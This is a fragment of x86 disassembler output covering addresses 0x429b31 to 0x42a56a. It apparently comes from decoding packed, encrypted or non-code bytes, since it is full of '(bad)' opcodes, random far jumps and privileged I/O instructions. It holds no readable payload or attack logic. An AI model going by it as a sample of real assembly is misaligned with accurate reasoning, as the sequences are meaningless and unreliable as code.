  429b31:	call   0x9371ba55
  429b36:	xchg   edi,eax
  429b37:	cli    
  429b38:	and    bl,ch
  429b3a:	sub    eax,0x65472e7a
  429b3f:	scas   eax,DWORD PTR es:[edi]
  429b40:	mov    dl,BYTE PTR [ebp+0x43]
  429b43:	sbb    BYTE PTR [esi+0x22d9e17f],ah
  429b49:	(bad)  
  429b4a:	and    eax,0x1ebee068
  429b4f:	push   eax
  429b50:	int    0xc0
  429b52:	(bad)  
  429b53:	push   ebx
  429b54:	mov    BYTE PTR ds:0x24a534fc,ch
  429b5a:	push   0x64
  429b5c:	add    DWORD PTR [edx-0x7c],edi
  429b5f:	mov    edx,0xf9988030
  429b64:	shr    DWORD PTR ds:0x18b15575,cl
  429b6a:	ins    BYTE PTR es:[edi],dx
  429b6b:	fisttp DWORD PTR ds:0xc6b0a658
  429b71:	repnz mov DWORD PTR [esp+eax*4-0x5c158711],edx
  429b79:	popa   
  429b7a:	(bad)  
  429b7c:	sub    BYTE PTR [ebp+0x74b25e8d],cl
  429b82:	in     eax,0xa3
  429b84:	mov    ds,WORD PTR [ebp+eax*1-0x3e3ead2b]
  429b8b:	stos   BYTE PTR es:[edi],al
  429b8c:	es lahf 
  429b8e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429b8f:	push   esi
  429b90:	loope  0x429b9c
  429b92:	shr    BYTE PTR [eax],1
  429b94:	loopne 0x429b66
  429b96:	cs push ss
  429b98:	or     dh,dl
  429b9a:	retf   0x7a3a
  429b9d:	add    BYTE PTR [ebp+0x4b],dh
  429ba0:	loope  0x429bd1
  429ba2:	xor    al,0x5f
  429ba4:	out    dx,al
  429ba5:	rcr    DWORD PTR [esi],cl
  429ba7:	push   edi
  429ba8:	stc    
  429ba9:	add    DWORD PTR ds:0x9874329,0x4f
  429bb0:	sahf   
  429bb1:	jne    0x429c27
  429bb3:	aad    0x4
	...
  429c15:	add    BYTE PTR [ebx-0x487759ea],ah
  429c1b:	mov    eax,0x52a3faf
  429c20:	xchg   esp,eax
  429c21:	pop    eax
  429c22:	int3   
  429c23:	xor    DWORD PTR [eax+0x1be4c07],ebx
  429c29:	add    BYTE PTR [edi],al
  429c2b:	add    DWORD PTR [eax],eax
  429c2d:	add    BYTE PTR [eax-0x13],dh
  429c30:	push   ebp
  429c31:	bound  eax,QWORD PTR [esi]
  429c33:	daa    
  429c34:	(bad)  
  429c35:	enter  0x4dc,0x6b
  429c39:	pop    es
  429c3a:	sbb    eax,0x1549737d
  429c3f:	popf   
  429c40:	push   esp
  429c41:	mov    cl,0x6e
  429c43:	push   0xffffff99
  429c45:	dec    esi
  429c46:	jae    0x429c94
  429c48:	jp     0x429c0f
  429c4a:	pop    eax
  429c4b:	and    eax,0x299d42a7
  429c50:	push   esi
  429c51:	inc    eax
  429c52:	sbb    ebx,ebp
  429c54:	and    eax,0xc65d23f3
  429c59:	xor    BYTE PTR [eax-0x72544ea1],bh
  429c5f:	(bad)  [ecx]
  429c61:	adc    BYTE PTR [eax],ch
  429c63:	cmp    eax,0xd6b8e834
  429c68:	fs jae 0x429c95
  429c6b:	mov    BYTE PTR fs:[edx+0x46],dh
  429c6f:	enter  0xb777,0xae
  429c73:	mov    al,ds:0x743622fb
  429c78:	mov    edx,0x7cc9c108
  429c7d:	repnz fs add DWORD PTR cs:[edx-0x12],esi
  429c83:	in     eax,0x30
  429c85:	repnz loopne 0x429c7b
  429c88:	jbe    0x429cb6
  429c8a:	loope  0x429c73
  429c8c:	sub    BYTE PTR [edx+0x66d63c49],dl
  429c92:	std    
  429c93:	add    BYTE PTR [esi-0x28],0xf
  429c97:	les    edi,FWORD PTR [edx-0x73]
  429c9a:	xor    cl,BYTE PTR [edi-0x4e]
  429c9d:	mov    WORD PTR [edi],ss
  429c9f:	repnz add eax,0xa65a8bc6
  429ca5:	fwait
  429ca6:	repz and dh,BYTE PTR [esi+0x34]
  429caa:	jge    0x429cf5
  429cac:	jp     0x429c8b
  429cae:	bound  edx,QWORD PTR [ebx+eax*1-0x3]
  429cb2:	jmp    0x429d19
  429cb4:	test   eax,0x854fee1e
  429cb9:	sub    DWORD PTR [edx+0x6f],ebp
  429cbc:	sbb    BYTE PTR [edi-0x738957b6],dh
  429cc2:	mov    ah,0xb5
  429cc4:	jecxz  0x429d0d
  429cc6:	xchg   ebx,eax
  429cc7:	mov    ds:0xca18b12e,eax
  429ccc:	push   edi
  429ccd:	pop    ds
  429cce:	fwait
  429ccf:	jg     0x429ca8
  429cd1:	fadd   st(2),st
  429cd3:	adc    dl,ch
  429cd5:	(bad)  
  429cd6:	push   esi
  429cd7:	or     esp,0xffffffa1
  429cda:	mov    ds:0x84761108,eax
  429cdf:	sbb    al,0x31
  429ce1:	mov    ah,0xba
  429ce3:	inc    ebp
  429ce4:	in     eax,0x6a
  429ce6:	mov    bx,0x7f87
  429cea:	fwait
  429ceb:	into   
  429cec:	outs   dx,BYTE PTR ds:[esi]
  429ced:	cld    
  429cee:	inc    BYTE PTR [edi]
  429cf0:	arpl   cx,si
  429cf2:	cwde   
  429cf3:	xor    edx,esi
  429cf5:	js     0x429c8e
  429cf7:	add    eax,0x6fdaf4e8
  429cfc:	jmp    0x4cc:0x2b62f6dc
  429d03:	icebp  
  429d04:	sti    
  429d05:	cmc    
  429d06:	outs   dx,DWORD PTR ds:[esi]
  429d07:	xchg   edi,eax
  429d08:	pop    esi
  429d09:	pop    esp
  429d0a:	test   DWORD PTR [esi+0x4a],ebp
  429d0d:	out    dx,eax
  429d0e:	or     al,0x68
  429d10:	test   DWORD PTR [ebp-0x537926bd],eax
  429d16:	inc    esp
  429d17:	jae    0x429d50
  429d19:	imul   ecx,DWORD PTR [ebp+eax*1-0x3be54c20],0xffffff8e
  429d21:	int    0xcf
  429d23:	mov    cl,0xa
  429d25:	sub    DWORD PTR [esi+ebp*2],ecx
  429d28:	mov    edx,0xe846cf7f
  429d2d:	fsub   st(5),st
  429d2f:	push   0x34e9c49b
  429d34:	inc    BYTE PTR [eax]
	...
  429d96:	fwait
  429d97:	mov    bh,0xc4
  429d99:	or     al,0xec
  429d9b:	jg     0x429d78
  429d9d:	mov    bh,0xb8
  429d9f:	xor    al,0xdf
  429da1:	sub    eax,0x69b15512
  429da6:	push   ebx
  429da7:	mov    edi,0x1070001
  429dac:	add    BYTE PTR [eax],al
  429dae:	bound  esp,QWORD PTR [edx+esi*2-0x8e9f918]
  429db5:	cmp    al,0xdf
  429db7:	dec    ebx
  429db8:	lds    edi,FWORD PTR [ebx+0x1f]
  429dbb:	xor    al,0xb
  429dbd:	not    BYTE PTR [edx]
  429dbf:	call   0xa1d2c7d9
  429dc4:	inc    edx
  429dc5:	std    
  429dc6:	lods   al,BYTE PTR ds:[esi]
  429dc7:	inc    ecx
  429dc8:	push   ecx
  429dc9:	ja     0x429db2
  429dcb:	sub    BYTE PTR [eax+0x7e],ch
  429dce:	scas   al,BYTE PTR es:[edi]
  429dcf:	sub    ebx,DWORD PTR [eax]
  429dd1:	or     edi,DWORD PTR [esi+ebp*4+0xc]
  429dd5:	sub    BYTE PTR ds:0x6611f66,bl
  429ddb:	int    0xf1
  429ddd:	pop    ebp
  429dde:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429ddf:	dec    esi
  429de0:	add    esp,DWORD PTR [eax+0xe]
  429de3:	stc    
  429de4:	sahf   
  429de5:	iret   
  429de6:	adc    DWORD PTR [ecx-0x5bc99049],edi
  429dec:	and    eax,0x39a7985d
  429df1:	xchg   esp,eax
  429df2:	adc    eax,0x83a78556
  429df7:	ror    BYTE PTR [edx],1
  429df9:	or     al,0x55
  429dfb:	xor    bh,BYTE PTR [ecx+0x21e9bf3e]
  429e01:	neg    DWORD PTR [eax]
  429e03:	jge    0x429e84
  429e05:	push   esp
  429e06:	ror    DWORD PTR [ecx-0x2dda29bf],0xb5
  429e0d:	imul   edx,eax,0xffffffa1
  429e10:	inc    edi
  429e11:	repnz mov BYTE PTR ss:[ebp+0x5e776071],0xf5
  429e1a:	call   0xcc8d:0x1212a635
  429e21:	and    eax,0xa9c38a87
  429e26:	retf   
  429e27:	int3   
  429e28:	nop
  429e29:	rcr    edx,cl
  429e2b:	fsub   st(2),st
  429e2d:	dec    edx
  429e2e:	push   esp
  429e2f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429e30:	test   eax,0x4a00d7b9
  429e35:	daa    
  429e36:	fnstcw WORD PTR [eax+edi*1+0x2d]
  429e3a:	retf   0x2b42
  429e3d:	cwde   
  429e3e:	jp     0x429e2d
  429e40:	xor    BYTE PTR [ebx+0x19],ah
  429e43:	add    dh,bl
  429e45:	pop    ebx
  429e46:	xor    al,0xd
  429e48:	inc    ebx
  429e49:	test   DWORD PTR [esi+esi*4],eax
  429e4c:	mov    eax,ds:0x72c111db
  429e51:	or     ebp,DWORD PTR [esi]
  429e53:	xlat   BYTE PTR ds:[ebx]
  429e54:	xchg   BYTE PTR [esi-0x34],ah
  429e57:	add    BYTE PTR [ecx+ebx*2],cl
  429e5a:	lock jle 0x429e36
  429e5d:	out    dx,al
  429e5e:	aas    
  429e5f:	call   0x977b7d1
  429e64:	pop    eax
  429e65:	push   ebp
  429e66:	call   0xb182:0xb378ee0d
  429e6d:	loopne 0x429e14
  429e6f:	bound  ebp,QWORD PTR [ecx-0x1]
  429e72:	aam    0xba
  429e74:	ret    0xcee1
  429e77:	lahf   
  429e78:	or     ebp,DWORD PTR [edi]
  429e7a:	ins    DWORD PTR es:[edi],dx
  429e7b:	out    dx,al
  429e7c:	xor    al,0x4c
  429e7e:	aas    
  429e7f:	mov    ebp,0x61672ba4
  429e84:	stc    
  429e85:	xor    al,0x76
  429e87:	jbe    0x429ee5
  429e89:	cmp    BYTE PTR [edx+0x39a4afc0],dl
  429e8f:	or     bl,BYTE PTR [edx+0x57aac7e8]
  429e95:	pop    es
  429e96:	push   edi
  429e97:	adc    al,0x7f
  429e99:	in     al,0xdb
  429e9b:	pop    edi
  429e9c:	test   ch,0xd4
  429e9f:	scas   eax,DWORD PTR es:[edi]
  429ea0:	xchg   BYTE PTR [edx+edx*2-0x144f19c8],ch
  429ea7:	ja     0x429ef0
  429ea9:	cmp    dl,BYTE PTR [ebp+eax*4-0x699d0228]
  429eb0:	mov    ebp,0xcf6b6b63
	...
  429f15:	add    BYTE PTR [ecx],dh
  429f17:	inc    ebp
  429f18:	enter  0xfc06,0x8f
  429f1c:	push   DWORD PTR [edi+0x54]
  429f1f:	into   
  429f20:	fnstcw WORD PTR ds:0x75eb2f19
  429f26:	pop    edx
  429f27:	rol    BYTE PTR [ecx],0x0
  429f2a:	pop    es
  429f2b:	add    DWORD PTR [eax],eax
  429f2d:	add    cl,bh
  429f2f:	mov    ecx,0xc0ead32b
  429f34:	adc    eax,0xcb86d959
  429f39:	add    eax,0x78b1b7fb
  429f3e:	int    0x9
  429f40:	out    dx,eax
  429f41:	rcr    esi,cl
  429f43:	mov    cl,0xcb
  429f45:	cmp    ebp,eax
  429f47:	xor    al,0x73
  429f49:	lds    ecx,FWORD PTR [eax]
  429f4b:	cli    
  429f4c:	push   esp
  429f4d:	xor    ebp,esi
  429f4f:	(bad)  
  429f50:	jecxz  0x429f1c
  429f52:	push   eax
  429f53:	rcl    ah,1
  429f55:	ret    0xfb79
  429f58:	inc    DWORD PTR [ebx-0x36]
  429f5b:	hlt    
  429f5c:	pusha  
  429f5d:	jmp    0xbda0:0x52d99e5b
  429f64:	or     dh,BYTE PTR [esi+edx*2-0x7f556dc2]
  429f6b:	cmp    al,0x6a
  429f6d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429f6e:	imul   eax
  429f70:	xchg   esi,eax
  429f71:	pop    esi
  429f72:	push   cs
  429f73:	pushf  
  429f74:	inc    edx
  429f75:	int3   
  429f76:	push   esp
  429f77:	mov    eax,0xb4b4e70d
  429f7c:	jmp    0x429fe2
  429f7e:	repnz ss ins DWORD PTR es:[edi],dx
  429f81:	shl    DWORD PTR [edi-0xe],cl
  429f84:	mov    ebx,0x38f511e5
  429f89:	mov    WORD PTR [edx],fs
  429f8b:	test   al,0xd6
  429f8d:	bound  ecx,QWORD PTR [ecx-0x613879a2]
  429f93:	loopne 0x429fa2
  429f95:	xchg   esi,eax
  429f96:	xor    DWORD PTR [ebp-0x2b],0xd27f25d3
  429f9d:	in     al,0xe7
  429f9f:	loopne 0x429ffc
  429fa1:	(bad)  
  429fa2:	(bad)  
  429fa3:	xchg   ecx,eax
  429fa4:	mov    al,0x23
  429fa6:	add    ax,0x1d28
  429faa:	mov    eax,ds:0xe5d2d36e
  429fb0:	pushf  
  429fb1:	je     0x429fb1
  429fb3:	mov    edi,DWORD PTR ds:0xdb6fd6d3
  429fb9:	mov    esp,0xc9230e74
  429fbe:	mov    cl,0xec
  429fc0:	(bad)  
  429fc1:	pop    ebp
  429fc2:	push   ds
  429fc3:	pop    ss
  429fc4:	xchg   edi,eax
  429fc5:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429fc7:	add    BYTE PTR [esi-0x965b2ee],ch
  429fcd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429fce:	shl    DWORD PTR [edi-0x7d61c0e5],1
  429fd4:	in     eax,dx
  429fd5:	push   ebx
  429fd6:	hlt    
  429fd7:	inc    edx
  429fd8:	and    edx,esi
  429fda:	outs   dx,DWORD PTR ds:[esi]
  429fdb:	push   0x17
  429fdd:	mov    edi,0xc796b685
  429fe2:	sbb    ebx,DWORD PTR [eax+0x63]
  429fe5:	add    edi,DWORD PTR [ebp-0x79]
  429fe8:	mov    BYTE PTR [edx+0x599a0f69],ah
  429fee:	fistp  QWORD PTR [edi+0x19ff26a8]
  429ff4:	icebp  
  429ff5:	push   esp
  429ff6:	fsub   DWORD PTR [ebx]
  429ff8:	out    dx,eax
  429ff9:	mov    BYTE PTR [ebp-0x14],0x7f
  429ffd:	inc    ebp
  429ffe:	add    al,BYTE PTR ds:0x1ffeaca2
  42a004:	in     eax,0x96
  42a006:	sbb    ecx,ebx
  42a008:	push   edi
  42a009:	cld    
  42a00a:	stos   BYTE PTR es:[edi],al
  42a00b:	iret   
  42a00c:	dec    edx
  42a00d:	cld    
  42a00e:	adc    eax,0x15479c78
  42a013:	inc    edi
  42a014:	call   0xf2ec:0x9a69edc6
  42a01b:	inc    ebp
  42a01c:	push   0x68
  42a01e:	jle    0x42a09c
  42a020:	pop    ds
  42a021:	cmc    
  42a022:	xor    al,0x3e
  42a024:	scas   eax,DWORD PTR es:[edi]
  42a025:	cmp    ebx,0x59e245c4
  42a02b:	lea    eax,[eax]
  42a02d:	aas    
  42a02e:	rol    DWORD PTR [eax-0x502276ad],1
  42a034:	mov    cl,0x0
	...
  42a096:	xlat   BYTE PTR ds:[ebx]
  42a097:	pushf  
  42a098:	shr    BYTE PTR [ebp-0x1000235],0x30
  42a09f:	xchg   esi,eax
  42a0a0:	mov    esi,0x4d43e44e
  42a0a5:	xchg   ecx,eax
  42a0a6:	popa   
  42a0a7:	rol    DWORD PTR [ecx],0x0
  42a0aa:	pop    es
  42a0ab:	add    DWORD PTR [eax],eax
  42a0ad:	add    BYTE PTR [ecx+edx*8-0x34c43331],dh
  42a0b4:	push   0xffffff8e
  42a0b6:	test   eax,0xe7db374
  42a0bb:	imul   eax,DWORD PTR [edx+0x742100b7],0x47e3866
  42a0c5:	inc    edx
  42a0c6:	mov    edx,0x6d27a5f8
  42a0cb:	int    0xcd
  42a0cd:	push   edx
  42a0ce:	adc    BYTE PTR [ecx-0x6c],bh
  42a0d1:	jge    0x42a085
  42a0d3:	mov    eax,ds:0x50afae36
  42a0d8:	jecxz  0x42a127
  42a0da:	cli    
  42a0db:	call   0x1e19:0xd554fd51
  42a0e2:	push   esp
  42a0e3:	cli    
  42a0e4:	dec    edx
  42a0e5:	out    0xa0,al
  42a0e7:	sub    eax,0x7ca5c5ca
  42a0ec:	fsubr  QWORD PTR [edx-0xaaaac68]
  42a0f2:	(bad)  
  42a0f3:	cmp    eax,0x38fcfcc0
  42a0f8:	lods   eax,DWORD PTR ds:[esi]
  42a0f9:	dec    ebp
  42a0fa:	sbb    BYTE PTR [ecx+0x35],al
  42a0fd:	push   ds
  42a0fe:	sub    esp,DWORD PTR [edi+0x33]
  42a101:	dec    eax
  42a102:	mov    bl,0xca
  42a104:	loop   0x42a134
  42a106:	inc    esp
  42a107:	dec    ebx
  42a108:	int    0x5a
  42a10a:	adc    al,0x88
  42a10c:	pop    es
  42a10d:	inc    edx
  42a10e:	mov    esi,0x2990d8bb
  42a113:	pop    esp
  42a114:	jnp    0x42a109
  42a116:	js     0x42a17a
  42a118:	cwde   
  42a119:	test   eax,0x56dcd156
  42a11e:	mov    ds,WORD PTR [eax-0x4415f2]
  42a124:	iret   
  42a125:	mov    esi,0xfc4c52c5
  42a12a:	adc    eax,0xff56c13c
  42a12f:	retf   
  42a130:	hlt    
  42a131:	mov    eax,ds:0x89f0f8a2
  42a136:	xchg   ebx,eax
  42a137:	push   esi
  42a138:	je     0x42a0dc
  42a13a:	imul   ebp,ecx,0x24ab88a0
  42a140:	and    DWORD PTR [eax-0x61],edi
  42a143:	push   esi
  42a144:	push   0x46
  42a146:	aaa    
  42a147:	adc    al,0xc9
  42a149:	inc    eax
  42a14a:	imul   BYTE PTR [edx-0x55e09eed]
  42a150:	adc    dl,dl
  42a152:	mov    BYTE PTR [ecx],dl
  42a154:	mov    eax,ds:0x99c5c6f3
  42a159:	mov    ah,0xa
  42a15b:	(bad)  
  42a15c:	jmp    0xcd0e7cad
  42a161:	(bad)
  42a164:	or     ch,dl
  42a166:	mov    ah,0x13
  42a168:	in     al,dx
  42a169:	adc    BYTE PTR [edx-0x2510ad16],ch
  42a16f:	std    
  42a170:	jmp    0xdfee:0xddedcd3c
  42a177:	je     0x42a1d4
  42a179:	nop
  42a17a:	push   edx
  42a17b:	or     esi,esp
  42a17d:	retf   
  42a17e:	(bad)  
  42a17f:	pop    ecx
  42a180:	inc    ebp
  42a181:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a182:	neg    ch
  42a184:	fisub  WORD PTR [ecx-0x2a]
  42a187:	dec    esp
  42a188:	jmp    0xc8d5:0xfb0b80fc
  42a18f:	push   eax
  42a190:	adc    al,0x47
  42a192:	gs popf 
  42a194:	adc    BYTE PTR [ecx+0x2f61b0ca],ah
  42a19a:	pushf  
  42a19b:	sub    edi,0x9a8a8b21
  42a1a1:	aaa    
  42a1a2:	pop    ebx
  42a1a3:	ror    esp,cl
  42a1a5:	lock pop ds
  42a1a7:	pop    edi
  42a1a8:	jbe    0x42a133
  42a1aa:	mov    ecx,0x50540587
  42a1af:	ins    DWORD PTR es:[edi],dx
  42a1b0:	and    BYTE PTR [ebx],al
  42a1b2:	aad    0xc0
  42a1b4:	aas    
	...
  42a215:	add    BYTE PTR [ebx],ch
  42a217:	test   DWORD PTR [ebp-0x50e640e7],edx
  42a21d:	mov    bh,0x15
  42a21f:	fucomip st,st(5)
  42a221:	imul   ebx,DWORD PTR [esi+0x4d],0xc2684f2f
  42a228:	add    DWORD PTR [eax],eax
  42a22a:	pop    es
  42a22b:	add    DWORD PTR [eax],eax
  42a22d:	add    dl,al
  42a22f:	mov    ebx,0x4f6b1530
  42a234:	jmp    0x42a213
  42a236:	xor    al,0x87
  42a238:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42a239:	bound  ebp,QWORD PTR [ecx-0x4814a661]
  42a23f:	ret    0x3391
  42a242:	jnp    0x42a21c
  42a244:	xor    ebp,esi
  42a246:	cdq    
  42a247:	xchg   edi,eax
  42a248:	push   edx
  42a249:	ins    DWORD PTR es:[edi],dx
  42a24a:	fidiv  DWORD PTR [ecx]
  42a24c:	mov    dl,0xfe
  42a24e:	dec    edi
  42a24f:	inc    edi
  42a250:	repz bound ebx,QWORD PTR [esi+0x50b4682]
  42a257:	aas    
  42a258:	xchg   edx,eax
  42a259:	add    eax,DWORD PTR [ebx]
  42a25b:	dec    edi
  42a25c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42a25d:	stc    
  42a25e:	mov    DWORD PTR [ebx],0xbf2e9db8
  42a264:	dec    ebp
  42a265:	fild   DWORD PTR [ebx-0x3165ef9e]
  42a26b:	sub    ecx,ecx
  42a26d:	pop    ds
  42a26e:	mov    bl,0xf0
  42a270:	mov    edi,0x3d69e567
  42a275:	daa    
  42a276:	outs   dx,DWORD PTR ds:[esi]
  42a277:	pop    ebx
  42a278:	mov    dl,dh
  42a27a:	ins    DWORD PTR es:[edi],dx
  42a27b:	jae    0x42a272
  42a27d:	clc    
  42a27e:	idiv   DWORD PTR [edi+0x5098711c]
  42a284:	out    0x75,eax
  42a286:	cli    
  42a287:	gs test eax,0x755ab450
  42a28d:	xor    DWORD PTR [eax-0x30cfdfea],ebx
  42a293:	xor    al,0x6
  42a295:	loop   0x42a311
  42a297:	dec    ebp
  42a298:	repnz out dx,eax
  42a29a:	pop    ss
  42a29b:	fstp   QWORD PTR [ecx]
  42a29d:	stos   BYTE PTR es:[edi],al
  42a29e:	sbb    cl,ch
  42a2a0:	adc    edi,DWORD PTR [ebp+0x40d55dc0]
  42a2a6:	fs repnz mov cl,0xc
  42a2aa:	mov    esp,DWORD PTR [ebx+0x52bf6bd8]
  42a2b0:	dec    esp
  42a2b1:	mov    dl,BYTE PTR ds:0x3c1b70e7
  42a2b7:	fcom   DWORD PTR [eax+0x7]
  42a2ba:	in     al,dx
  42a2bb:	cdq    
  42a2bc:	sub    edi,DWORD PTR [edi+0x14]
  42a2bf:	push   esi
  42a2c0:	dec    esi
  42a2c1:	out    dx,al
  42a2c2:	jecxz  0x42a292
  42a2c4:	dec    esi
  42a2c5:	rol    DWORD PTR [edi+0x9874b0e],1
  42a2cb:	xchg   edx,eax
  42a2cc:	js     0x42a320
  42a2ce:	adc    edx,DWORD PTR [ebp-0x19]
  42a2d1:	dec    edi
  42a2d2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42a2d3:	push   esi
  42a2d4:	in     al,0xa8
  42a2d6:	push   ebp
  42a2d7:	mul    ch
  42a2d9:	pop    ds
  42a2da:	xchg   edi,eax
  42a2db:	push   esp
  42a2dc:	dec    esi
  42a2dd:	fild   WORD PTR [esi]
  42a2df:	sub    ecx,DWORD PTR [edx+0x479b710e]
  42a2e5:	ja     0x42a2b4
  42a2e7:	jae    0x42a2d4
  42a2e9:	loope  0x42a30f
  42a2eb:	(bad)  
  42a2ed:	aas    
  42a2ee:	aas    
  42a2ef:	jl     0x42a290
  42a2f1:	push   esp
  42a2f2:	outs   dx,BYTE PTR ds:[esi]
  42a2f3:	aas    
  42a2f4:	es xor eax,0x30
  42a2f8:	stc    
  42a2f9:	int    0x8c
  42a2fb:	out    dx,eax
  42a2fc:	repz clc 
  42a2fe:	push   edx
  42a2ff:	inc    eax
  42a300:	jnp    0x42a2ee
  42a302:	pushf  
  42a303:	mov    edi,0xb8c30519
  42a308:	jecxz  0x42a384
  42a30a:	into   
  42a30b:	mov    ?,ecx
  42a30d:	aaa    
  42a30e:	ret    0x72db
  42a311:	jmp    0x52405696
  42a316:	pop    ebx
  42a317:	dec    esi
  42a318:	mov    ecx,0x13a18eaf
  42a31d:	retf   0xdbc0
  42a320:	neg    BYTE PTR [ebp-0x77]
  42a323:	add    al,0x1e
  42a325:	loopne 0x42a2d0
  42a327:	cmp    cl,0xce
  42a32a:	test   eax,0x6683bcc9
  42a32f:	popf   
  42a330:	jl     0x42a2e3
  42a332:	mov    ebp,0xd05e
	...
  42a393:	add    BYTE PTR [eax],al
  42a395:	add    BYTE PTR [edi+0xe],bh
  42a398:	jne    0x42a3d5
  42a39a:	jne    0x42a417
  42a39c:	jg     0x42a3ec
  42a39e:	ds loop 0x42a3ca
  42a3a1:	retf   0xd04
  42a3a4:	imul   ebx,DWORD PTR [edx+0x1c36f],0x7
  42a3ab:	add    DWORD PTR [eax],eax
  42a3ad:	add    BYTE PTR [edx-0x4a],al
  42a3b0:	jbe    0x42a3d7
  42a3b2:	dec    edx
  42a3b3:	out    dx,al
  42a3b4:	jecxz  0x42a3fe
  42a3b6:	pop    eax
  42a3b7:	or     cl,ah
  42a3b9:	push   ds
  42a3ba:	dec    esp
  42a3bb:	mov    esp,0x27c2ca71
  42a3c0:	in     al,0xbd
  42a3c2:	jbe    0x42a437
  42a3c4:	lahf   
  42a3c5:	js     0x42a3ce
  42a3c7:	pop    esi
  42a3c8:	jbe    0x42a3f5
  42a3ca:	xchg   edi,eax
  42a3cb:	(bad)  
  42a3cc:	bound  edx,QWORD PTR [eax-0x65]
  42a3cf:	dec    ecx
  42a3d0:	xor    bh,BYTE PTR [esi+0x2bfeca19]
  42a3d6:	int3   
  42a3d7:	jl     0x42a37d
  42a3d9:	mov    dl,0xcc
  42a3db:	xchg   esp,eax
  42a3dc:	scas   eax,DWORD PTR es:[edi]
  42a3dd:	sub    eax,0x5d47f6c0
  42a3e2:	mov    WORD PTR [edi-0x6a],?
  42a3e5:	mov    ebx,0x90525916
  42a3ea:	push   ecx
  42a3eb:	sub    al,0xeb
  42a3ed:	rcr    BYTE PTR [ecx],0x89
  42a3f0:	pop    ebp
  42a3f1:	mov    ebp,0xb921747a
  42a3f6:	clc    
  42a3f7:	sbb    bh,BYTE PTR [ecx-0x1e]
  42a3fa:	mov    bl,0xf5
  42a3fc:	cmp    ch,bl
  42a3fe:	frstor [edi+ebp*4-0x6cd65283]
  42a405:	leave  
  42a406:	popf   
  42a407:	xchg   ecx,eax
  42a408:	add    al,0x5d
  42a40a:	(bad)  
  42a40b:	popa   
  42a40c:	retf   
  42a40d:	cmp    al,0x39
  42a40f:	jmp    0x42a426
  42a411:	jne    0x42a3e8
  42a413:	(bad)  
  42a414:	out    0xc5,eax
  42a416:	push   esi
  42a417:	aad    0x31
  42a419:	(bad)  
  42a41a:	int    0xdc
  42a41c:	popf   
  42a41d:	lock adc BYTE PTR [ebx+edi*8-0x49],dl
  42a422:	mov    ecx,0x7edfa6eb
  42a427:	call   0x4c4a:0x63fb714d
  42a42e:	adc    eax,0x18c20066
  42a433:	mov    ah,0x8f
  42a435:	loope  0x42a42d
  42a437:	sub    dl,BYTE PTR [edi-0x595f055b]
  42a43d:	scas   al,BYTE PTR es:[edi]
  42a43e:	gs addr16 jp 0x42a414
  42a442:	stos   DWORD PTR es:[edi],eax
  42a443:	cwde   
  42a444:	sbb    DWORD PTR [ecx+0x66f21f40],edi
  42a44a:	or     al,0xde
  42a44c:	cdq    
  42a44d:	loope  0x42a4aa
  42a44f:	fnsave [ecx]
  42a451:	in     al,dx
  42a452:	test   eax,0x89fb3914
  42a457:	push   es
  42a458:	lahf   
  42a459:	bound  esp,QWORD PTR [ebx]
  42a45b:	pop    ecx
  42a45c:	lea    edx,[ebp+0x6c]
  42a45f:	hlt    
  42a460:	mov    DWORD PTR [ebp+esi*4+0x7a470d30],edx
  42a467:	dec    ebp
  42a468:	sub    ebx,esi
  42a46a:	cmp    esp,edx
  42a46c:	dec    edi
  42a46d:	cmp    eax,0xefefbdcc
  42a472:	jmp    0x206c5001
  42a477:	dec    edi
  42a478:	cmp    ebx,DWORD PTR [eax+0xa]
  42a47b:	ins    DWORD PTR es:[edi],dx
  42a47c:	ret    
  42a47d:	fwait
  42a47e:	dec    edx
  42a47f:	pop    esi
  42a480:	(bad)  
  42a481:	leave  
  42a482:	or     al,0x61
  42a484:	cwde   
  42a485:	stos   DWORD PTR es:[edi],eax
  42a486:	mov    ds:0xccc6fc1d,al
  42a48b:	sub    BYTE PTR [eax+0x19],al
  42a48e:	pop    ebp
  42a48f:	inc    eax
  42a490:	mov    WORD PTR [ecx+0x457962b2],fs
  42a496:	inc    eax
  42a497:	jecxz  0x42a4ae
  42a499:	sbb    DWORD PTR [ecx],esp
  42a49b:	and    cl,BYTE PTR [ecx+0x4c]
  42a49e:	push   es
  42a49f:	jmp    0x42a46c
  42a4a1:	mov    ebx,0xa9eee7b7
  42a4a6:	cmp    BYTE PTR [eax+0xa],ch
  42a4a9:	xor    bl,BYTE PTR [ebx-0x51f4a995]
  42a4af:	xchg   edx,eax
  42a4b0:	sub    ch,BYTE PTR [ebx-0x5]
  42a4b3:	repnz add BYTE PTR fs:[eax],al
	...
  42a513:	add    BYTE PTR [eax],al
  42a515:	add    BYTE PTR [eax],bl
  42a517:	dec    edi
  42a518:	pop    ss
  42a519:	mov    ecx,0xefbef957
  42a51e:	mov    cl,0xd7
  42a520:	dec    ebp
  42a521:	add    dl,bl
  42a523:	(bad)  
  42a524:	shr    BYTE PTR [esi+esi*2+0x70001c4],1
  42a52b:	add    DWORD PTR [eax],eax
  42a52d:	add    BYTE PTR ds:0x3fe1e6ef,ch
  42a533:	sub    esi,ebp
  42a535:	push   eax
  42a536:	(bad)  
  42a537:	jecxz  0x42a573
  42a539:	lods   al,BYTE PTR ds:[esi]
  42a53a:	fild   WORD PTR [ecx-0x32866269]
  42a540:	jle    0x42a5ac
  42a542:	mov    cl,0x5b
  42a544:	mov    esp,0x8d4900c8
  42a549:	in     al,dx
  42a54a:	popa   
  42a54b:	jae    0x42a527
  42a54d:	scas   al,BYTE PTR es:[edi]
  42a54e:	push   ds
  42a54f:	inc    esi
  42a550:	enter  0xc54f,0xc8
  42a554:	jge    0x42a539
  42a556:	cdq    
  42a557:	dec    ecx
  42a558:	in     al,dx
  42a559:	aaa    
  42a55a:	inc    edi
  42a55b:	cwde   
  42a55c:	and    eax,0xc333bd27
  42a561:	xchg   ebp,eax
  42a562:	(bad)  
  42a563:	(bad)  
  42a564:	push   ss
  42a565:	mov    edx,0xe4d3d740
  42a56a:	sbb    bl,ah
